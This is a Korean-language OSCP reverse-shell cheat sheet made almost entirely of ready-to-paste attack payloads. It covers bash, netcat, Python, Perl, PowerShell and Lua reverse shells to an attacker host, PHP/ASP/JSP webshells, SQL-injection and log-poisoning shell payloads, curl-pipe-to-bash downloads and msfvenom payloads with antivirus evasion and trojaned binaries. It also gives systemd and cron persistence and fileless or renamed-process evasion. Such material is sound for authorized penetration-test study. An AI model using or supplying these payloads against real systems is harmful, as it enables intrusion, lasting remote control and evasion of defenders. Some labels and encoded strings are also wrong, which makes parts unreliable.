# Reverse Shells - OSCP 공격 가이드

> **목표: 웹 공격 성공 후 안정적인 리버스 쉘 획득 → 시스템 완전 장악**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🎧 리스너 설정 (공격자 머신)

```bash
# Netcat 리스너 (가장 기본)
nc -lvnp 443
nc -lvnp 4444
nc -lvnp 8080

# 다중 연결 허용 (mkfifo 사용)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp 443 >/tmp/f

# OpenSSL 암호화 리스너 (네트워크 탐지 우회)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# Socat 리스너
socat file:`tty`,raw,echo=0 tcp-listen:443
socat openssl-listen:443,cert=cert.pem,key=key.pem,verify=0 -

# Metasploit 리스너
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST {ATTACKER_IP}
set LPORT 443
run
```

### 🐧 리눅스 리버스 쉘

```bash
# Bash TCP (가장 안정적)
bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
exec 5<>/dev/tcp/{ATTACKER_IP}/443;cat <&5 | while read line; do $line 2>&5 >&5; done

# Bash UDP
bash -i >& /dev/udp/{ATTACKER_IP}/443 0>&1

# Netcat 다양한 버전
nc -e /bin/sh {ATTACKER_IP} 443
nc -c /bin/sh {ATTACKER_IP} 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 443 >/tmp/f

# Netcat without -e flag
nc {ATTACKER_IP} 443 | /bin/sh | nc {ATTACKER_IP} 444
nc {ATTACKER_IP} 443 | /bin/bash | nc {ATTACKER_IP} 444

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="{ATTACKER_IP}";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("{ATTACKER_IP}",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat
socat tcp-connect:{ATTACKER_IP}:443 exec:/bin/sh,pty,stderr,setpgid,sigint,sane

# Node.js
require('child_process').exec('nc -e /bin/sh {ATTACKER_IP} 443')

# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ATTACKER_IP}','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 🪟 윈도우 리버스 쉘

```powershell
# PowerShell TCP (가장 효과적)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell 압축 버전
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}/shell.ps1')"

# PowerShell Base64 인코딩
powershell -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBBAFQAVABBAEMASwBFAFIAXwBJAFAAfQAiACwANAA0ADMAKQA7AA==

# CMD Netcat
nc.exe -e cmd.exe {ATTACKER_IP} 443

# CMD 없이 Netcat
echo cmd | nc {ATTACKER_IP} 443

# Python Windows
python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ATTACKER_IP}',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])"

# VBScript
echo "Set ws = CreateObject(""WScript.Shell"")" > shell.vbs & echo "Set obj = ws.Exec(""cmd /c powershell -nop -c """"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""""")" >> shell.vbs & cscript shell.vbs
```

## 🎯 상황별 페이로드

### 🌐 웹쉘을 통한 리버스 쉘

```php
# PHP 웹쉘 → 리버스 쉘
<?php system("bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'"); ?>
<?php system("nc -e /bin/sh {ATTACKER_IP} 443"); ?>
<?php system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"); ?>

# PHP exec 사용
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'"); ?>

# PHP shell_exec 사용
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 443 >/tmp/f"); ?>

# PHP passthru 사용
<?php passthru("socat tcp-connect:{ATTACKER_IP}:443 exec:/bin/sh,pty,stderr,setpgid,sigint,sane"); ?>

# ASP.NET 웹쉘 → 리버스 쉘
<%@ Page Language="C#" %>
<%
System.Diagnostics.Process.Start("powershell.exe", "-nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
%>

# JSP 웹쉘 → 리버스 쉘
<%
Runtime.getRuntime().exec("bash -c 'exec 5<>/dev/tcp/{ATTACKER_IP}/443;cat <&5 | while read line; do $line 2>&5 >&5; done'");
%>
```

### 💉 SQL Injection을 통한 리버스 쉘

```sql
# MySQL xp_cmdshell (MSSQL)
'; EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''{ATTACKER_IP}'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'; --

# MySQL INTO OUTFILE
'; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'; --

# PostgreSQL COPY
'; COPY (SELECT 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1') TO PROGRAM 'bash'; --

# MySQL UDF (User Defined Function)
'; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1"'); --
```

### 📁 LFI를 통한 리버스 쉘

```bash
# Log Poisoning → 리버스 쉘
# 1. User-Agent 포이즈닝
curl -A "<?php system('bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1\"'); ?>" http://{TARGET_IP}/

# 2. 로그 파일 포함
../../../../../../../var/log/apache2/access.log

# SSH 로그 포이즈닝
ssh '<?php system($_GET["cmd"]); ?>'@{TARGET_IP}
../../../../../../../var/log/auth.log&cmd=bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'

# /proc/self/environ 포이즈닝
# User-Agent 헤더 설정 후
../../../../../../../proc/self/environ
```

### 🔧 Command Injection을 통한 리버스 쉘

```bash
# 백그라운드 실행 (연결 차단 방지)
; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &
; (bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1') &

# nohup 사용 (세션 종료되어도 유지)
; nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &

# 출력 리다이렉션 (에러 숨김)
; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' > /dev/null 2>&1 &

# Windows PowerShell
& powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}/shell.ps1')"
```

## 🔄 우회 기법들

### 🚫 Netcat 없을 때 대안

```bash
# /dev/tcp 사용
bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
exec 5<>/dev/tcp/{ATTACKER_IP}/443;cat <&5 | while read line; do $line 2>&5 >&5; done

# Telnet 사용
rm -f /tmp/p; mknod /tmp/p p && telnet {ATTACKER_IP} 443 0</tmp/p | /bin/bash 1>/tmp/p

# SSH 역방향 터널
ssh -R 443:localhost:22 user@{ATTACKER_IP}

# curl/wget을 통한 스크립트 다운로드 후 실행
curl -s http://{ATTACKER_IP}/shell.sh | bash
wget -qO- http://{ATTACKER_IP}/shell.sh | bash

# Base64 인코딩된 스크립트
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSVB9LzQ0MyAwPiYx" | base64 -d | bash

# 환경 변수 사용
export RHOST="{ATTACKER_IP}";export RPORT=443;bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
```

### 🔤 인코딩 우회

```bash
# Base64 인코딩
echo "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSVB9LzQ0MyAwPiYx
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSVB9LzQ0MyAwPiYx" | base64 -d | bash

# Hex 인코딩
echo "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" | xxd -p | tr -d '\n'
# 626173682d693e262f6465762f7463702f7b415454434b4552475f49507d2f343433303e2631
echo "626173682d693e262f6465762f7463702f7b415454434b4552475f49507d2f343433303e2631" | xxd -r -p | bash

# URL 인코딩
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%7BATTACKER_IP%7D%2F443%200%3E%261

# PowerShell Base64 인코딩 (UTF-16LE)
$command = "IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -nop -enc $encoded

# HTML 엔티티 인코딩
&#98;&#97;&#115;&#104;&#32;&#45;&#105;&#32;&#62;&#38;&#32;&#47;&#100;&#101;&#118;&#47;&#116;&#99;&#112;&#47;&#123;&#65;&#84;&#84;&#65;&#67;&#75;&#69;&#82;&#95;&#73;&#80;&#125;&#47;&#52;&#52;&#51;&#32;&#48;&#62;&#38;&#49;
```

### 🔐 SSL/TLS 암호화 쉘

```bash
# OpenSSL 리버스 쉘 (공격자)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# OpenSSL 리버스 쉘 (타겟)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ATTACKER_IP}:443 > /tmp/s; rm /tmp/s

# Socat SSL 쉘 (공격자)
socat openssl-listen:443,cert=cert.pem,key=key.pem,verify=0 -

# Socat SSL 쉘 (타겟)
socat openssl-connect:{ATTACKER_IP}:443,verify=0 exec:/bin/bash,pty,stderr,setpgid,sigint,sane
```

### 🌐 HTTP/HTTPS 터널링

```bash
# HTTP 터널을 통한 쉘
# 공격자 서버 (Python)
python3 -c "
import http.server
import socketserver
import subprocess
import threading

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        result = subprocess.run(post_data, shell=True, capture_output=True, text=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(result.stdout.encode() + result.stderr.encode())

with socketserver.TCPServer(('', 8080), Handler) as httpd:
    httpd.serve_forever()
"

# 타겟에서 HTTP 쉘 클라이언트
while true; do
    echo -n "$ "; read cmd
    curl -X POST -d "$cmd" http://{ATTACKER_IP}:8080/
done

# DNS 터널링 (dnscat2)
# 공격자
ruby dnscat2.rb --dns "domain=shell.{ATTACKER_DOMAIN}"

# 타겟
./dnscat --dns domain=shell.{ATTACKER_DOMAIN}
```

### 🚪 포트 제한 우회

```bash
# 일반적으로 허용되는 포트들
80    # HTTP
443   # HTTPS
53    # DNS
22    # SSH
21    # FTP
25    # SMTP
110   # POP3
143   # IMAP
993   # IMAPS
995   # POP3S

# 다중 포트 시도
for port in 80 443 53 22 21 25 110 143 993 995; do
    bash -i >& /dev/tcp/{ATTACKER_IP}/$port 0>&1 && break
done

# UDP 포트 사용
bash -i >& /dev/udp/{ATTACKER_IP}/53 0>&1

# 포트 바인딩 (Bind Shell로 전환)
nc -lvnp 4444 -e /bin/bash

# IPv6 사용 (방화벽 우회)
bash -i >& /dev/tcp/2001:db8::1/443 0>&1
```

## 🤖 자동화 도구 명령어

### 🔫 MSFVenom 페이로드 생성

```bash
# Linux ELF 바이너리
msfvenom -p linux/x86/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f elf > shell64.elf

# Windows EXE 바이너리
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f exe > shell64.exe

# Python 스크립트
msfvenom -p cmd/unix/reverse_python LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.py

# PowerShell 스크립트
msfvenom -p cmd/windows/reverse_powershell LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.ps1

# PHP 웹쉘
msfvenom -p php/reverse_php LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.php

# JSP 웹쉘
msfvenom -p java/jsp_shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.jsp

# WAR 파일 (Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f war > shell.war

# ASP 웹쉘
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f asp > shell.asp

# ASPX 웹쉘
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f aspx > shell.aspx

# Bash 스크립트
msfvenom -p cmd/unix/reverse_bash LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.sh

# Perl 스크립트
msfvenom -p cmd/unix/reverse_perl LHOST={ATTACKER_IP} LPORT=443 -f raw > shell.pl
```

### 🔧 인코딩 및 우회

```bash
# 인코더를 사용한 AV 우회
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe

# 다중 인코딩
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -e x86/shikata_ga_nai -e x86/alpha_upper -i 5 -f exe > double_encoded.exe

# 템플릿 사용 (정상 바이너리에 삽입)
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -x /path/to/template.exe -f exe > trojaned.exe

# 암호화
msfvenom -p windows/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 --encrypt aes256 --encrypt-key mykey -f exe > encrypted.exe

# 다른 아키텍처
msfvenom -p linux/armle/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f elf > arm_shell.elf
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f elf > mips_shell.elf
```

### 🐍 자동화 쉘 스크립트

```bash
#!/bin/bash
# 자동 리버스 쉘 생성기

ATTACKER_IP="$1"
PORT="$2"

if [ $# -ne 2 ]; then
    echo "Usage: $0 <ATTACKER_IP> <PORT>"
    exit 1
fi

echo "[+] Generating reverse shells for $ATTACKER_IP:$PORT"

# Bash 쉘들
cat > shells.txt << EOF
# Bash shells
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
exec 5<>/dev/tcp/$ATTACKER_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done

# Netcat shells
nc -e /bin/sh $ATTACKER_IP $PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP $PORT >/tmp/f

# Python shells
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Base64 encoded bash
$(echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1" | base64 -w 0)

# URL encoded
$(echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1" | sed 's/ /%20/g;s/&/%26/g;s/>/%3E/g;s/</%3C/g;s/\//%2F/g')
EOF

echo "[+] Generated shells saved to shells.txt"

# 자동 리스너 시작
echo "[+] Starting listeners..."
gnome-terminal -- bash -c "nc -lvnp $PORT"
```

### 🔄 PowerShell 원라이너 생성기

```python
#!/usr/bin/env python3
import base64
import sys

def generate_powershell_reverse_shell(ip, port):
    # PowerShell 리버스 쉘 템플릿
    template = f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''

    # UTF-16LE 인코딩 후 Base64
    encoded_bytes = template.encode('utf-16le')
    b64_command = base64.b64encode(encoded_bytes).decode()

    print(f"[+] PowerShell Reverse Shell for {ip}:{port}")
    print(f"[+] Raw command:")
    print(f"powershell -nop -c \"{template}\"")
    print(f"\n[+] Base64 encoded:")
    print(f"powershell -nop -enc {b64_command}")
    print(f"\n[+] One-liner for web execution:")
    print(f"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://{ip}/shell.ps1')\"")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 ps_shell_gen.py <IP> <PORT>")
        sys.exit(1)

    generate_powershell_reverse_shell(sys.argv[1], sys.argv[2])
```

## 🚨 문제 해결

### ❌ 연결이 안 될 때

```bash
# 1. 방화벽 확인
# 공격자 머신에서 방화벽 해제
sudo iptables -F
sudo ufw disable

# 2. 다른 포트 시도
for port in 80 443 53 22 21 25 110 143 993 995 8080 8443; do
    echo "[+] Trying port $port"
    timeout 5 bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/$port 0>&1" && break
done

# 3. UDP 시도
bash -i >& /dev/udp/{ATTACKER_IP}/53 0>&1

# 4. IPv6 시도
bash -i >& /dev/tcp/::1/443 0>&1

# 5. HTTP/HTTPS 프록시 사용
curl --proxy http://proxy:8080 http://{ATTACKER_IP}/shell.sh | bash

# 6. DNS 터널링
dig @{ATTACKER_IP} $(echo "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" | base64).tunnel.{ATTACKER_DOMAIN}
```

### 🔌 연결이 바로 끊어질 때

```bash
# 1. 백그라운드 실행
bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &

# 2. nohup 사용
nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &

# 3. screen/tmux 세션에서 실행
screen -S shell bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'

# 4. 재연결 루프
while true; do
    bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
    sleep 10
done &

# 5. 파일 기반 지속성
echo 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' > /tmp/.shell.sh
chmod +x /tmp/.shell.sh
nohup /tmp/.shell.sh &

# 6. 시스템 서비스로 등록 (권한 있을 때)
cat > /etc/systemd/system/shell.service << EOF
[Unit]
Description=Shell Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable shell.service
systemctl start shell.service
```

### 🚫 바이너리가 없을 때

```bash
# 1. Netcat이 없을 때
# /dev/tcp 사용
bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1

# telnet 사용
rm -f /tmp/p; mknod /tmp/p p && telnet {ATTACKER_IP} 443 0</tmp/p | /bin/bash 1>/tmp/p

# 2. Python이 없을 때
# Perl 사용
perl -e 'use Socket;$i="{ATTACKER_IP}";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby 사용
ruby -rsocket -e'f=TCPSocket.open("{ATTACKER_IP}",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# 3. 모든 스크립팅 언어가 없을 때
# 컴파일된 바이너리 업로드
wget http://{ATTACKER_IP}/nc -O /tmp/nc
chmod +x /tmp/nc
/tmp/nc -e /bin/sh {ATTACKER_IP} 443

# 4. wget/curl도 없을 때
# /dev/tcp로 직접 다운로드
exec 3<>/dev/tcp/{ATTACKER_IP}/80
echo -e "GET /nc HTTP/1.1\nHost: {ATTACKER_IP}\n\n" >&3
cat <&3 > /tmp/nc
```

### 🔐 보안 소프트웨어 우회

```bash
# 1. 프로세스명 변경
cp /bin/bash /tmp/update
/tmp/update -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1

# 2. 메모리 내 실행
curl -s http://{ATTACKER_IP}/shell.sh | bash -s

# 3. 파일리스 실행
bash -c "$(curl -s http://{ATTACKER_IP}/shell.sh)"

# 4. 암호화된 연결
# SSL/TLS 사용
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ATTACKER_IP}:443 > /tmp/s; rm /tmp/s

# 5. HTTP 터널링
while true; do
    cmd=$(curl -s http://{ATTACKER_IP}:8080/cmd)
    eval "$cmd" | curl -X POST -d @- http://{ATTACKER_IP}:8080/result
    sleep 1
done &

# 6. 시간 지연 (Behavior-based 탐지 우회)
sleep 300  # 5분 대기
bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
```

### 🌐 웹 환경에서 쉘 업그레이드

```bash
# 1. 웹쉘에서 리버스 쉘로
# 웹쉘에서 실행:
bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &

# 2. 제한된 웹쉘에서 전체 쉘로
# 백그라운드 작업으로 실행
nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' > /dev/null 2>&1 &

# 3. PHP 세션 유지
# PHP 코드로 지속적 연결
<?php
ignore_user_abort(true);
set_time_limit(0);
$ip = '{ATTACKER_IP}';
$port = 443;
$sock = fsockopen($ip, $port);
while(!feof($sock)){
    $cmd = fread($sock, 1024);
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}
fclose($sock);
?>

# 4. 웹 디렉토리에 지속성 파일 생성
echo '*/5 * * * * bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' > /var/www/html/.cron
chmod +x /var/www/html/.cron
```

## 📊 성공 판정 기준

### ✅ 리버스 쉘 연결 성공

- **프롬프트 표시**: `$`, `#`, `PS >` 등 쉘 프롬프트 출력
- **명령어 실행**: `whoami`, `id`, `pwd` 등 기본 명령어 정상 동작
- **인터랙티브**: 명령어 입력 후 즉시 응답 수신
- **안정성**: 연결이 끊어지지 않고 지속적 유지

### ✅ 쉘 품질 확인

- **TTY 쉘**: `python -c 'import pty; pty.spawn("/bin/bash")'` 성공
- **히스토리**: `history` 명령어로 명령어 히스토리 확인
- **자동완성**: Tab 키로 파일명/명령어 자동완성 동작
- **신호 처리**: Ctrl+C, Ctrl+Z 등 신호 정상 처리

### ⏰ 시간 관리

- **즉시 시도**: 웹 공격 성공 시 즉시 리버스 쉘 시도
- **5분 이내**: 기본 페이로드로 연결 성공
- **10분 이내**: 우회 기법으로 연결 성공
- **15분 이내**: 쉘 안정화 및 지속성 확보
- **연결 실패**: 다른 공격 벡터 모색 또는 바인드 쉘 시도

**성공 후 즉시**: 쉘 안정화 → 권한상승 → 지속성 확보

## 💡 OSCP 실전 팁

- **다중 리스너**: 여러 포트에 리스너 준비 (443, 80, 53, 8080)
- **자동 재연결**: 쉘이 끊어져도 자동으로 재연결되도록 설정
- **암호화 연결**: 네트워크 모니터링 우회용 SSL/TLS 쉘
- **지속성**: cron, systemd, startup script로 재부팅 후에도 접근
- **백업 방법**: 여러 방법으로 접근 경로 확보 (웹쉘 + 리버스쉘 + SSH키)
- **쉘 업그레이드**: 획득 즉시 TTY 쉘로 업그레이드 → `SHELLS/shell-upgrade.md`
